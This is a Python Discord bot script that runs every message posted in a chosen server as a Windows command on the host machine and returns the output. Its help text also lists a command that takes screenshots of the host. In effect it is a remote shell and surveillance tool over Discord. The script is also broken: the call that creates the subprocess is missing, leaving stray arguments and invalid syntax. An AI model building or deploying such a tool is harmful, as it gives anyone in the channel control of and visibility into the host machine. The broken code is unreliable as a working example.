"""
Quite possibly broken - I am work ing on this whenver i feel like so commands may not work properly or be incomplete.
"""

import discord
from discord import Intents
import os
import subprocess
import asyncio

guild_id = id  # Replace with your server ID
TOKEN = "token"  # Replace with your bot token

intents = Intents.default()
intents.message_content = True

async def run_cmd(command):
    """Execute Windows commands asynchronously"""
    try:
        # Create process with Windows cmd.exei 
            f"cmd /c {command}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=True
        )
        
        # Get command output with timeout
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
        output = stdout.decode('cp437', errors='replace') or stderr.decode('cp437', errors='replace')
        return output.strip()
    
    except asyncio.TimeoutError:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Error: {str(e)}"

class CmdClient(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.synced = False 

    async def on_ready(self):
        if not self.synced:
            self.synced = True
            print(f"Windows CMD emulator active as {self.user}")

client = CmdClient()

@client.event 
async def on_message(message):
    if message.author == client.user or not message.guild:
        return

    if message.guild.id != guild_id:
        return

    content = message.content.strip()
    
    # Help command
    if content.lower() == "--help":
        help_msg = (
            "```--Help:\n\n"
            "Any message will be executed as a Windows command unless stated with --\n"
            "Command list:\n"
            "  --help                   - Show this help\n"
            "  --StartScreenCap {time}  - Takes screenshots of host machine\n"
            "```"
        )
        await message.channel.send(help_msg)
        return

    # Execute all other messages as commands
    try:
        print(f"Executing: {content}")
        result = await run_cmd(content)
        
        # Format output for Discord
        if len(result) > 1900:
            result = result[:1900] + "\n... (output truncated)"
        
        await message.channel.send(f"```> {content}\n\n{result}```")
        print(f"Command executed successfully")
        
    except Exception as e:
        await message.channel.send(f"```Error: {str(e)}```")
        print(f"Command failed: {e}")

# Start the bot
client.run(TOKEN)